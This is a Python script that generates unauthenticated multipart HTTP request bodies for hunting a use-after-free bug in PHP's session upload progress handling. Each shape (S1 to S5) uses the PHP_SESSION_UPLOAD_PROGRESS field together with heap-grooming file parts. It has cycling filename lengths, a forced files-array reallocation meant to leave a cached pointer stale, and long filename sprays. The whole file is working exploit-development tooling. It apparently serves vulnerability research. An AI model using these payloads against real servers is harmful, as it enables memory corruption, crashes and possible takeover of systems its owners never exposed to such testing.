#!/usr/bin/env python3
"""Generate attack body shapes for the machinery UAF hunt (all UNAUTHENTICATED,
pure multipart machinery manipulation; no app changes, no victims touched).
Usage: gen_shape.py S1|S2|S3|S5 [-o body] [--sid SID] [--key KEY]
"""
import sys, os, argparse

BOUND = "BOUND"

def part_header(kind, name=None, filename=None, extra=b""):
    out = b"--" + BOUND.encode() + b"\r\n"
    if kind == "field":
        out += b"Content-Disposition: form-data; name=\"" + name.encode() + b"\"\r\n"
    else:
        out += b"Content-Disposition: form-data; name=\"" + name.encode() + \
               b"\"; filename=\"" + filename.encode() + b"\"\r\n"
        out += extra
        out += b"Content-Type: application/octet-stream\r\n"
    out += b"\r\n"
    return out

def make_body(nfiles, sid, key, file_size, fname_lens=(40, 27), big_fname=False):
    """Standard body: progress field first, then file parts."""
    cdisp_extra = b""
    out = b""
    out += part_header("field", "PHP_SESSION_UPLOAD_PROGRESS")
    out += key.encode() + b"\r\n"
    for i in range(nfiles):
        # groom: filename length cycles through provided lens (allocator shape)
        if big_fname:
            fl = 4000 + (i * 37) % 500
        elif fname_lens is None:
            fl = 48
        else:
            fl = fname_lens[i % len(fname_lens)]
        fn = "F" + str(i) + "x" * fl
        out += part_header("file", f"file{i}", fn, cdisp_extra)
        out += b"U" * file_size + b"\r\n"
    out += b"--" + BOUND.encode() + b"--\r\n"
    return out

def make_progress_only(sid, key):
    """Machinery census: ONLY the progress key field (+1 tiny file to start
    the machinery) - used as S4 request 2 to force record plant/replace."""
    out = b""
    out += part_header("field", "PHP_SESSION_UPLOAD_PROGRESS")
    out += key.encode() + b"\r\n"
    out += part_header("file", "auxfile", "auxname0")
    out += b"Z" * 16 + b"\r\n"
    out += b"--" + BOUND.encode() + b"--\r\n"
    return out

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("shape")
    ap.add_argument("-o", "--out", default=None)
    ap.add_argument("--sid", default="mach-shape-001")
    ap.add_argument("--key", default="shape-key")
    args = ap.parse_args()

    if args.shape == "S1":
        body = make_body(3, args.sid, args.key, 40952, (40, 27, 33))
    elif args.shape == "S2":
        # 11 small files: forces files[] to realloc at insertion #9 while the
        # cached current_file_bytes_processed keeps pointing at file1/2 buckets.
        body = make_body(11, args.sid, args.key, 128, (40, 27, 33, 60))
    elif args.shape == "S3":
        # big body for --limit-rate pacing (updates every >=1s min_freq)
        body = make_body(4, args.sid, args.key, 302080, (48, 27, 300))
    elif args.shape == "S4":
        # machinery-content lever continuation: tiny body, same sid as a
        # already-created session file.
        body = make_progress_only(args.sid, args.key)
    elif args.shape == "S5":
        # filename groom: long, cycling-length names spray decoded strings
        body = make_body(5, args.sid, args.key, 2048, None, big_fname=True)
    else:
        print("unknown shape", file=sys.stderr); sys.exit(2)

    if args.out:
        with open(args.out, "wb") as f:
            f.write(body)
    else:
        sys.stdout.buffer.write(body)

if __name__ == "__main__":
    main()
